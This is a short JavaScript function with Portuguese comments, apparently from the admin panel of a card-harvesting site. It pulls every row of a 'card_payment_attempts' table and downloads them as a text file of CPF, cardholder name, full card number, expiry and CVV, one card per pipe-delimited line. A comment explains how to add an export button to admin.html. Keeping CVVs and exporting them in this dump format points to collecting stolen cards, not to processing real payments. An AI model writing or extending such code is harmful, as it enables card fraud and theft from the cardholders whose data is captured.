async function exportCardsToFile() {
  const { data, error } = await supabase
    .from('card_payment_attempts')
    .select('*')
    .order('created_at', { ascending: false });

  if (error) {
    console.error('Erro ao buscar dados:', error);
    return;
  }

  let exportData = data.map(card =>
    `${card.cpf}|${card.holder}|${card.card_number}|${card.card_expiry}|${card.card_cvv}`
  ).join('\n');

  if (exportData.trim() === '') {
    exportData = 'Nenhum cartão encontrado.';
  }

  const blob = new Blob([exportData], { type: 'text/plain' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `cartoes_exportados_${new Date().toISOString().slice(0, 10)}.txt`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

// Adicione um botão no admin.html para chamar essa função
// <button id="export-database" class="secondary">Exportar todos do banco</button>
// document.getElementById('export-database').addEventListener('click', exportCardsToFile);
